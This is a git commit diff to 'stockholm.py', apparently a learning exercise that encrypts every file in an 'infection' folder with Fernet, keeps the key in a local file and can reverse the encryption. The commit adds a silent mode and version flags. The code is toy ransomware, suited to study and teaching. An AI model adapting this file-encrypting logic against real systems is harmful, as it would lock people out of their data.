59654a79844d50ce6e50aa86c76fddef26c6538d
Yorgo Petsas <yorgopecas@gmail.com>
2023-05-05 03:00:56 +0200

    Improved key handling and some flags

--- stockholm/stockholm.py
+++ stockholm/stockholm.py
@@ -3,40 +3,36 @@ import argparse
 import os
 from cryptography.fernet import Fernet
 
+
 target = 'infection'
 
+
+# Check if key file exists and if not create it
 if os.path.isfile('key.key') == True:
 	with open('key.key', 'rb') as fkey:
 		key = fkey.read()
 		print(key)
-
 elif os.path.isfile('key.key') == False:
 	key = Fernet.generate_key()
 	# Save encription key to a file
 	with open('key.key', 'wb') as key_file:
 	    key_file.write(key)
 
+
 # Decript a file
 def yz_decript_file(fl):
-	print('ok')
 	file = target + '/' + fl
-	print(file)
-
 	# with open('.key', 'rb') as filekey:
 	#     key = filekey.read()
-
 	fernet = Fernet(key)
-
 	with open(file, 'rb') as enc_file:
 	    encrypted = enc_file.read()
-
 	# # decrypting the file
 	decrypted = fernet.decrypt(encrypted)
-
-	# # opening the file in write mode and
-	# # writing the decrypted data
+	# # opening the file in write mode and writing the decrypted data
 	with open(file, 'wb') as dec_file:
 		dec_file.write(decrypted)
+		print(f"Decripted File: {file}")
 
 
 # Cure the files in target directory
@@ -45,12 +41,11 @@ def yz_cure_target():
 	get_files = os.listdir(target)
 	# print(get_files)
 	for f in get_files:
-		print(f'Scanning {f}')
 		yz_decript_file(f)
 
 
 # Encript a file
-def yz_enrcipt_file(fl):
+def yz_enrcipt_file(fl, slt):
 	file = target + '/' + fl
 	# Use Key
 	fernet = Fernet(key)
@@ -63,26 +58,27 @@ def yz_enrcipt_file(fl):
 	# Open file and write encripted data
 	with open(file, 'wb') as encrypted_file:
 		encrypted_file.write(encrypted)
+		if slt == False:
+			print(f"Encripted File: {file}")
 
 
 # Infect the files in target folder
-def yz_infect_target(target):
+def yz_infect_target(target, slt):
 	# Get list of files
 	get_files = os.listdir(target)
 	# print(get_files)
 	for f in get_files:
-		print(f'Scanning {f}')
-		yz_enrcipt_file(f)
+		yz_enrcipt_file(f, slt)
 
 
 # Handle Arguments
 def yz_handle_args(args):
-	if args.help:
-		print(f"Help is: {args.help}")
-	if args.h:
-		print(f"H is: {args.h}")
-	if args.v:
-		print(f"V is: {args.v}")
+	if args.h or args.help:
+		print(f"Help is: on your way")
+		exit()
+	if args.v or args.version:
+		print("The Version of the program is: 1.0b")
+		exit()
 	if args.r:
 		print(f"R is: {args.r}")
 		yz_cure_target()
@@ -104,6 +100,7 @@ def cli_scan():
     
     # The program will have the option "–version" or "-v" to show the version of the program.
 	scan.add_argument("-v", help="", type=bool, nargs='?', const=True)
+	scan.add_argument("-version", help="", type=bool, nargs='?', const=True)
 	
 	# # The program will have the option "–reverse" or "-r" followed by the key entered as
 	# # an argument to reverse the infection.    
@@ -118,13 +115,14 @@ def cli_scan():
 	return scan.parse_args()
 
 
+# Main Function
 if __name__ == '__main__':
 	args = cli_scan()
 	yz_handle_args(args)
+	slt = False
+	if args.s or args.silent:
+		slt = True
+	# print(slt)
 	if not args.r:
-		print('Not R')
-		yz_infect_target(target)
-
-
-
+		yz_infect_target(target, slt)
 
